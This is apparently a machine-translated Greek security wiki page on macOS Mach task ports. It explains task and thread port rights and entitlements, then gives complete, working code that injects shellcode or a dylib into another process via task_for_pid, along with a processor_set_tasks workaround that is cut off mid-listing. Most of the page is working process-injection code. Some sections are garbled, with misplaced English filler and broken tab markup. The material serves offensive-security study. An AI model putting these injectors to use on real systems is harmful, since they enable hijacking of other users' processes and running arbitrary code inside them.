Αρχικά, το Mach δεν είχε "διεργασίες", είχε "tasks" που θεωρούνταν περισσότερο σαν ένας δοχείο νημάτων. Όταν το Mach συγχωνεύτηκε με το BSD, **κάθε task συσχετίστηκε με μια διεργασία BSD**. Συνεπώς, κάθε διεργασία BSD έχει τις λεπτομέρειες που χρειάζεται για να είναι μια διεργασία και κάθε task Mach έχει επίσης τις εσωτερικές λειτουργίες της (εκτός από το μη υπαρκτό pid 0 που είναι το `kernel_task`).

Υπάρχουν δύο πολύ ενδιαφέρουσες συναρτήσεις σχετικές με αυτό:

* `task_for_pid(target_task_port, pid, &task_port_of_pid)`: Λάβετε ένα SEND δικαίωμα για τη θύρα του task που σχετίζεται με το καθορισμένο από το `pid` και δώστε το στην καθορισμένη `target_task_port` (που συνήθως είναι το task καλούντος που χρησιμοποίησε το `mach_task_self()`, αλλά θα μπορούσε να είναι μια SEND θύρα σε διαφορετικό task.)
* `pid_for_task(task, &pid)`: Δεδομένου ενός SEND δικαιώματος σε ένα task, βρείτε σε ποιο PID σχετίζεται αυτό το task.

Για να εκτελέσετε ενέργειες εντός του task, το task χρειαζόταν ένα δικαίωμα `SEND` στον εαυτό του καλώντας το `mach_task_self()` (που χρησιμοποιεί το `task_self_trap` (28)). Με αυτή την άδεια, ένα task μπορεί να εκτελέσει διάφορες ενέργειες όπως:

* `task_threads`: Λάβετε SEND δικαίωμα πάνω από όλες τις θύρες task των νημάτων του task
* `task_info`: Λάβετε πληροφορίες για ένα task
* `task_suspend/resume`: Αναστολή ή επανέναρξη ενός task
* `task_[get/set]_special_port`
* `thread_create`: Δημιουργία ενός νήματος
* `task_[get/set]_state`: Έλεγχος κατάστασης task
* και περισσότερα μπορούν να βρεθούν στο [**mach/task.h**](https://github.com/phracker/MacOSX-SDKs/blob/master/MacOSX11.3.sdk/System/Library/Frameworks/Kernel.framework/Versions/A/Headers/mach/task.h)

{% hint style="danger" %}
Σημειώστε ότι με ένα SEND δικαίωμα πάνω σε μια θύρα task ενός **διαφορετικού task**, είναι δυνατόν να εκτελεστούν τέτοιες ενέργειες σε ένα διαφορετικό task.
{% endhint %}

Επιπλέον, η task\_port είναι επίσης η **θύρα `vm_map`** που επιτρέπει την **ανάγνωση και την τροποποίηση μνήμης** μέσα σε ένα task με συναρτήσεις όπως `vm_read()` και `vm_write()`. Αυτό σημαίνει βασικά ότι ένα task με δικαιώματα SEND πάνω στη task\_port ενός διαφορετικού task θα μπορεί να **ενθάρρυνει κώδικα σε αυτό το task**.

Θυμηθείτε ότι επειδή το **πυρήνας είναι επίσης ένα task**, αν κάποιος καταφέρει να λάβει **δικαιώματα SEND** πάνω στο **`kernel_task`**, θα μπορεί να κάνει τον πυρήνα να εκτελέσει οτιδήποτε (jailbreaks).

* Καλέστε το `mach_task_self()` για να **λάβετε το όνομα** γι' αυτή τη θύρα για το task του καλούντος. Αυτή η θύρα κληρονομείται μόνο κατά το **`exec()`**· ένα νέο task που δημιουργείται με `fork()` λαμβάνει μια νέα θύρα task (ως ειδική περίπτωση, ένα task λαμβάνει επίσης μια νέα θύρα task μετά το `exec()` σε ένα suid δυαδικό). Ο μόνος τρόπος να δημιουργηθεί ένα task και να ληφθεί η θύρα του είναι να εκτελεστεί ο ["χορός ανταλλαγής θυρών"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html) κατά τη διάρκεια ενός `fork()`.
* Αυτές είναι οι περιορισμοί για την πρόσβαση στη θύρα (από `macos_task_policy` από το δυαδικό `AppleMobileFileIntegrity`):
* Αν η εφαρμογή έχει το **δικαίωμα επιτρέπεται get-task-allow** διεργασίες από τον **ίδιο χρήστη μπορούν να έχουν πρόσβαση στη θύρα του task** (συνήθως προστίθεται από το Xcode για αποσφαλμάτωση). Η διαδικασία **επικύρωσης** δεν θα το επιτρέψει σε παραγωγικές εκδόσεις.
* Οι εφαρμογές με το **δικαίωμα com.apple.system-task-ports** μπορούν να λάβουν τη **θύρα task για οποιαδήποτε** διεργασία, εκτός από τον πυρήνα. Σε παλαιότερες εκδόσεις ονομαζόταν **task_for_pid-allow**. Αυτό χορηγείται μόνο σε εφαρμογές της Apple.
* **Ο ριζικός χρήστης μπορεί να έχει πρόσβαση στις θύρες task** εφαρμογών **που δεν** έχουν συνταχθεί με ένα **σκληρυνμένο** χρόνο εκτέλεσης (και όχι από την Apple).

**Η θύρα ονόματος task:** Μια μη προνομιούχα έκδοση της _θύρας task_. Αναφέρεται στο task, αλλά δεν επιτρέπει τον έλεγχό του. Το μόνο που φαίνεται να είναι διαθέσιμο μέσω αυτής είναι το `task_info()`.

### Θύρες Νημάτων

Τα νήματα έχουν επίσης συσχετισμένες θύρες, οι οποίες είναι ορατές από το task που καλεί το **`task_threads`** και από τον επεξεργαστή με το `processor_set_threads`. Ένα SEND δικαίωμα στη θύρα του νήματος επιτρέπει τη χρήση της λειτουργίας από το υποσύστημα `thread_act`, όπως:

* `thread_terminate`
* `thread_[get/set]_state`
* `act_[get/set]_state`
* `thread_[suspend/resume]`
* `thread_info`
* ...

Κάθε νήμα μπορεί να λάβει αυτή τη θύρα καλώντας το **`mach_thread_sef`**.

### Εισαγωγή Shellcode σε νήμα μέσω της θύρας Task

Μπορείτε να αντλήσετε ένα shellcode από:

{% content-ref url="../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
[arm64-basic-assembly.md](../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
{% endcontent-ref %}

{% tabs %}
{% tab title="mysleep.m" %}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{% endtab %}

{% tab title="entitlements.plist" %} 

## macOS Δικαιώματα

Τα δικαιώματα είναι μια λίστα με δικαιώματα που μπορούν να χορηγηθούν σε μια εφαρμογή macOS μέσω του αρχείου entitlements.plist. Αυτά τα δικαιώματα μπορούν να επιτρέψουν πρόσβαση σε ευαίσθητες λειτουργίες του συστήματος ή σε άλλες εφαρμογές. Είναι σημαντικό να διαχειρίζεστε προσεκτικά τα δικαιώματα που χορηγούνται σε κάθε εφαρμογή προκειμένου να διατηρηθεί η ασφάλεια του συστήματος. 

{% endtab %}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}

**Συντάξτε** το προηγούμενο πρόγραμμα και προσθέστε τα **δικαιώματα** για να μπορείτε να εισάγετε κώδικα με τον ίδιο χρήστη (αν όχι, θα χρειαστεί να χρησιμοποιήσετε **sudo**).

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector
// Based on https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a?permalink_comment_id=2981669
// and on https://newosxbook.com/src.jl?tree=listings&file=inject.c


#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</details>  

---

### macOS IPC (Inter-Process Communication)

Inter-Process Communication (IPC) mechanisms in macOS can be abused by attackers to escalate privileges and execute malicious actions. Understanding how IPC works in macOS is crucial for identifying and exploiting potential security weaknesses. This section explores common IPC mechanisms in macOS and how they can be leveraged for privilege escalation attacks.
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
{% hint style="success" %}
Για να λειτουργήσει αυτό στο iOS χρειάζεστε το entitlement `dynamic-codesigning` προκειμένου να μπορείτε να κάνετε μια εγγράψιμη μνήμη εκτελέσιμη.
{% endhint %}

### Εισαγωγή Dylib σε νήμα μέσω της θύρας Task

Στο macOS τα **νήματα** μπορούν να χειριστούν μέσω του **Mach** ή χρησιμοποιώντας το **posix `pthread` api**. Το νήμα που δημιουργήθηκε στην προηγούμενη εισαγωγή, δημιουργήθηκε χρησιμοποιώντας το Mach api, οπότε **δεν είναι συμμορφωμένο με το posix**.

Ήταν δυνατό να **εισαχθεί ένα απλό shellcode** για να εκτελέσει μια εντολή επειδή **δεν χρειαζόταν να λειτουργήσει με συμμορφωμένα με το posix** api, μόνο με το Mach. **Πιο πολύπλοκες εισαγωγές** θα χρειαζόντουσαν το **νήμα** να είναι επίσης **συμμορφωμένο με το posix**.

Συνεπώς, για να **βελτιώσετε το νήμα** θα πρέπει να καλέσει το **`pthread_create_from_mach_thread`** το οποίο θα **δημιουργήσει ένα έγκυρο pthread**. Στη συνέχεια, αυτό το νέο pthread θα μπορούσε να καλέσει το dlopen για να φορτώσει ένα dylib από το σύστημα, έτσι αντί να γράφετε νέο shellcode για να εκτελέσει διαφορετικές ενέργειες είναι δυνατό να φορτώσετε προσαρμοσμένες βιβλιοθήκες.

Μπορείτε να βρείτε **παραδειγματικές dylibs** σε (για παράδειγμα αυτή που δημιουργεί ένα αρχείο καταγραφής και μετά μπορείτε να το ακούσετε):

{% content-ref url="../macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md" %}
[macos-dyld-hijacking-and-dyld\_insert\_libraries.md](../macos-library-injection/macos-dyld-hijacking-and-dyld\_insert\_libraries.md)
{% endcontent-ref %}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
```c
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Αδυναμία ορισμού δικαιωμάτων μνήμης για τον κώδικα του απομακρυσμένου νήματος: Σφάλμα %s\n", mach_error_string(kr));
return (-4);
}

// Ορισμός δικαιωμάτων στη μνήμη στον εκχωρημένο χώρο στοίβας
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Αδυναμία ορισμού δικαιωμάτων μνήμης για τη στοίβα του απομακρυσμένου νήματος: Σφάλμα %s\n", mach_error_string(kr));
return (-4);
}


// Δημιουργία νήματος για την εκτέλεση του shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // αυτή είναι η πραγματική στοίβα
//remoteStack64 -= 8;  // απαιτείται ευθυγράμμιση των 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Απομακρυσμένη Στοίβα 64  0x%llx, Ο κώδικας είναι %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Αδυναμία δημιουργίας απομακρυσμένου νήματος: σφάλμα %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "Χρήση: %s _pid_ _ενέργεια_\n", argv[0]);
fprintf (stderr, "   _ενέργεια_: διαδρομή προς ένα dylib στον δίσκο\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Το Dylib δεν βρέθηκε\n");
}

}
```
</details>  

### Επικοινωνία μεταξύ Διεργασιών (IPC) στο macOS

Στο macOS, η επικοινωνία μεταξύ διεργασιών μπορεί να χρησιμοποιηθεί για την εκτέλεση επιθέσεων εκμετάλλευσης προνομίων. Οι επιθέσεις IPC μπορεί να εκμεταλλευτούν την αδυναμία του συστήματος να επιβάλει περιορισμοών στην επικοινωνία μεταξύ διεργασιών, επιτρέποντας την ανεπιθύμητη αλληλεπίδραση μεταξύ διαφορετικών διεργασιών. Είναι σημαντικό να εφαρμόζονται σκληρυντικά μέτρα στη διαχείριση της IPC στο macOS για την ενίσχυση της ασφάλειας του συστήματος.
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### Απαγωγή Νήματος μέσω Θύρας Task <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

Σε αυτήν την τεχνική γίνεται απαγωγή ενός νήματος της διεργασίας:

{% content-ref url="macos-thread-injection-via-task-port.md" %}
[macos-thread-injection-via-task-port.md](macos-thread-injection-via-task-port.md)
{% endcontent-ref %}

### Ανίχνευση Έγχυσης Θύρας Task Port

Όταν καλείται το `task_for_pid` ή το `thread_create_*` αυξάνει ένα μετρητή στη δομή task από τον πυρήνα που μπορεί να προσπελαστεί από τη λειτουργία χρήστη καλώντας task\_info(task, TASK\_EXTMOD\_INFO, ...)

## Θύρες Εξαιρέσεων

Όταν συμβεί μια εξαίρεση σε ένα νήμα, αυτή η εξαίρεση στέλνεται στην καθορισμένη θύρα εξαίρεσης του νήματος. Εάν το νήμα δεν τη χειρίζεται, τότε στέλνεται στις θύρες εξαιρέσεων της εργασίας. Εάν η εργασία δεν τη χειρίζεται, τότε στέλνεται στη θύρα του κεντρικού υπολογιστή που διαχειρίζεται από το launchd (όπου θα γίνει αναγνώριση). Αυτό ονομάζεται ταξινόμηση εξαιρέσεων.

Σημειώστε ότι στο τέλος συνήθως αν δεν χειριστείται σωστά η αναφορά θα καταλήξει να χειριστεί από τον δαίμονα ReportCrash. Ωστόσο, είναι δυνατόν για ένα άλλο νήμα στην ίδια εργασία να διαχειριστεί την εξαίρεση, αυτό είναι αυτό που κάνουν εργαλεία αναφοράς κρασαρίσματος όπως το `PLCrashReporter`.

## Άλλα Αντικείμενα

### Ρολόι

Οποιοσδήποτε χρήστης μπορεί να έχει πρόσβαση σε πληροφορίες σχετικά με το ρολόι, ωστόσο για να ορίσει την ώρα ή να τροποποιήσει άλλες ρυθμίσεις πρέπει να είναι ριζοχρήστης.

Για να λάβετε πληροφορίες είναι δυνατόν να καλέσετε συναρτήσεις από το υποσύστημα `clock` όπως: `clock_get_time`, `clock_get_attributtes` ή `clock_alarm`\
Για να τροποποιήσετε τιμές το υποσύστημα `clock_priv` μπορεί να χρησιμοποιηθεί με συναρτήσεις όπως `clock_set_time` και `clock_set_attributes`

### Επεξεργαστές και Σύνολο Επεξεργαστών

Οι διεπαφές του επεξεργαστή επιτρέπουν τον έλεγχο ενός μοναδικού λογικού επεξεργαστή καλώντας συναρτήσεις όπως `processor_start`, `processor_exit`, `processor_info`, `processor_get_assignment`...

Επιπλέον, οι διεπαφές του **συνόλου επεξεργαστών** παρέχουν έναν τρόπο για να ομαδοποιήσουν πολλούς επεξεργαστές σε μια ομάδα. Είναι δυνατόν να ανακτηθεί το προεπιλεγμένο σύνολο επεξεργαστών καλώντας **`processor_set_default`**.\
Αυτές είναι μερικές ενδιαφέρουσες διεπαφές για αλληλεπίδραση με το σύνολο επεξεργαστών:

* `processor_set_statistics`
* `processor_set_tasks`: Επιστρέφει έναν πίνακα δικαιωμάτων αποστολής σε όλες τις εργασίες μέσα στο σύνολο επεξεργαστών
* `processor_set_threads`: Επιστρέφει έναν πίνακα δικαιωμάτων αποστολής σε όλα τα νήματα μέσα στο σύνολο επεξεργαστών
* `processor_set_stack_usage`
* `processor_set_info`

Όπως αναφέρεται στην [**συγκεκριμένη δημοσίευση**](https://reverse.put.as/2014/05/05/about-the-processor\_set\_tasks-access-to-kernel-memory-vulnerability/), στο παρελθόν αυτό επέτρεπε την παράκαμψη της προηγούμενης προστασίας για τη λήψη θυρών εργασίας σε άλλες διεργασίες για να τις ελέγξετε καλώντας **`processor_set_tasks`** και λαμβάνοντας μια θύρα κεντρικού υπολογιστή σε κάθε διεργασία.\
Σήμερα χρειάζεστε ριζοδικαιώματα για να χρησιμοποιήσετε αυτήν τη λειτουργία και αυτό προστατεύεται, οπότε θα μπορείτε μόνο να λάβετε αυτές τις θύρες σε μη προστατευμένες διεργασίες.

Μπορείτε να το δοκιμάσετε με:

<details>

<summary><strong>Κώδικας processor_set_tasks</strong></summary>
````c
// Maincpart fo the code from https://newosxbook.com/articles/PST2.html
//gcc ./port_pid.c -o port_pid

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/sysctl.h>
#include <libproc.h>
#include <mach/mach.h>
#include <errno.h>
#include <string.h>
#include <mach/exception_types.h>
#include <mach/mach_host.h>
#include <mach/host_priv.h>
#include <mach/processor_set.h>
#include <mach/mach_init.h>
#include <mach/mach_port.h>
#include <mach/vm_map.h>
#include <mach/task.h>
#include <mach/task_info.h>
#include <mach/mach_traps.h>
#include <mach/mach_error.h>
#include <mach/thread_act.h>
#include <mach/thread_info.h>
#include <mach-o/loader.h>
#include <mach-o/nlist.h>
#include <sys/ptrace.h>

mach_port_t task_for_pid_workaround(int Pid)
{

host_t        myhost = mach_host_self(); // host self is host priv if you're root anyway..
mach_port_t   psDefault;
mach_port_t   psDefault_control;

task_array_t  tasks;
mach_msg_type_number_t numTasks;
int i;

thread_array_t       threads;
thread_info_data_t   tInfo;

kern_return_t kr;

kr = processor_set_default(myhost, &psDefault);

kr = host_processor_set_priv(myhost, psDefault, &psDefault_control);
if (kr != KERN_SUCCESS) { fprintf(stderr, "host_processor_set_priv failed with error %x\n", kr);
mach_error("host_processor_set_priv",kr); exit(1);}

printf("So far so good\n");

kr = processor_set_tasks(psDefault_control, &tasks, &numTasks);
